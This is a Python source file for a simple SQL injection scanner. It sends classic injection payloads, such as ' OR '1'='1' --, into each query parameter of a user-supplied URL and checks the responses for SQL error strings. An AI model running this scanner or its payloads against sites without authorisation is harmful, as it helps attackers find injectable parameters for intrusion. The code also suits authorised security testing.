# filepath: /SQLInjectionScanner/SQLInjectionScanner/scanner.py

import requests
from urllib.parse import urlparse, parse_qs, urlencode
import colorama
import sys

colorama.init(autoreset=True)

# Example payloads and SQL error patterns
payloads = ["'", "' OR '1'='1' --", '" OR "1"="1', "'--", "'#"]
sql_errors = ["you have an error in your sql syntax", "sqlstate", "mysql", "unclosed quotation"]

def parse_url(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    return parsed_url, query_params

def inject_payloads(url, query_params):
    vulnerable_params = []
    for param in query_params:
        for payload in payloads:
            modified_query = query_params.copy()
            modified_query[param] = [payload]
            modified_url = f"{url.split('?')[0]}?{urlencode(modified_query, doseq=True)}"
            print(f"Testing URL: {modified_url}")
            response = send_request(modified_url)
            if check_for_sql_errors(response):
                vulnerable_params.append(param)
                print(colorama.Fore.RED + f"Vulnerable parameter found: {param} with payload: {payload}")
    return vulnerable_params

def send_request(url):
    try:
        response = requests.get(url, timeout=5)
        return response.text
    except requests.exceptions.RequestException as e:
        print(colorama.Fore.YELLOW + f"Network error: {e}")
        return ""

def check_for_sql_errors(response):
    for error in sql_errors:
        if error.lower() in response.lower():
            return True
    return False

def main():
    target_url = input("Enter the target URL: ")
    parsed_url, query_params = parse_url(target_url)
    
    if not query_params:
        print(colorama.Fore.YELLOW + "No query parameters found in the URL.")
        sys.exit(1)

    print(colorama.Fore.GREEN + "Starting SQL Injection scan...")
    vulnerable_params = inject_payloads(target_url, query_params)

    if not vulnerable_params:
        print(colorama.Fore.GREEN + "No vulnerabilities found.")
    else:
        print(colorama.Fore.GREEN + "Scan completed.")

if __name__ == "__main__":
    main()